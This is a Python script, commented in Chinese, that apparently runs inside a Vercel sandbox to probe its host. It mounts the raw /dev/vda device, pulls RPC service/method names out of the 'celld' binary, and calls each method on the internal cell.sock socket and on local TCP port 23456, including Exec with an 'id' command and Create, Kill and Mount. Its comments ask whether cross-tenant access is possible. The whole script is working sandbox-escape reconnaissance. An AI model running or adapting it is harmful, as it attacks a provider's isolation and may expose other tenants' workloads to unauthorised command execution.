# -*- coding: utf-8 -*-
"""vda7_all_methods: 全 RPC 方法探测 (cell.sock + TCP 23456)
1) 挖完整 Service/Method 对
2) cell.sock: 每个方法带参数探测 (GetDriveStorageUsage/Containers Create/Exec/Celld Configure/SetWorkload...)
3) TCP 23456: 同方法集 (host celld? 跨租户?)
输出落盘 + 哨兵 V7T_DONE"""
import os, time, socket, ctypes, subprocess, re, json

OUT = '/vercel/sandbox/v7t.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:350].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def rpc_tcp(port, path, body='{}', t=3):
    try:
        s = socket.create_connection(('127.0.0.1', port), 3)
        s.settimeout(t)
        req = ('POST %s HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:350].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    # P1: 挖完整 Service/Method 对
    log('=== P1 service/method pairs ===')
    pairs = []
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
        pairs = sorted(set(re.findall(r'(vercel\.hive\.[A-Za-z0-9_.]+Service)/([A-Z][A-Za-z0-9]+)', txt)))
        log('pairs (%d):' % len(pairs))
        for svc, m in pairs:
            log('  %s/%s' % (svc, m))
    except Exception as e:
        log('P1 ERR %s' % e)

    # P2: cell.sock 全方法探测 (带智能 body)
    log('=== P2 cell.sock all methods ===')
    sp = '/mnt/vdax/run/cell/cell.sock'
    bodies = {
        'GetResourceUsage': '{}',
        'Heartbeat': '{}',
        'Configure': '{}',
        'SetWorkload': '{}',
        'GetDriveStorageUsage': '{}',
        'Create': '{}',
        'Start': '{}',
        'Exec': '{"command":["id"]}',
        'Kill': '{}',
        'Mount': '{}',
        'StreamOutput': '{}',
        'Wait': '{}',
        'CreateSnapshot': '{"drive_id":"a"}',
        'SetOCIImageConfig': '{}',
    }
    for svc, m in pairs:
        body = bodies.get(m, '{}')
        st, bd = rpc_unix(sp, '/%s/%s' % (svc, m), body, t=3)
        if '404' not in st:
            log('sock %s/%s -> %s | %s' % (svc.split('.')[-1], m, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.2)

    # P3: TCP 23456 同方法探测
    log('=== P3 tcp 23456 all methods ===')
    for svc, m in pairs:
        if 'cell.api' not in svc and 'celld.api' not in svc:
            continue
        body = bodies.get(m, '{}')
        st, bd = rpc_tcp(23456, '/%s/%s' % (svc, m), body, t=3)
        if '404' not in st:
            log('tcp %s/%s -> %s | %s' % (svc.split('.')[-1], m, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.2)

    # P4: api.cells.v1 / api.pools.v1 在 cell.sock 与 23456 上的存在性
    log('=== P4 host api probe ===')
    host_pairs = [p for p in pairs if 'api.cells' in p[0] or 'api.pools' in p[0]]
    for target, fn in [('sock', lambda p, b: rpc_unix(sp, p, b, t=3)),
                       ('tcp', lambda p, b: rpc_tcp(23456, p, b, t=3))]:
        for svc, m in host_pairs[:14]:
            st, bd = fn('/%s/%s' % (svc, m), '{}')
            log('%s host %s/%s -> %s | %s' % (target, svc.split('.')[-2], m, st, bd[:200].replace('\n', ' ')))
            time.sleep(0.2)

    log('V7T_DONE')
    f.close()


if __name__ == '__main__':
    main()
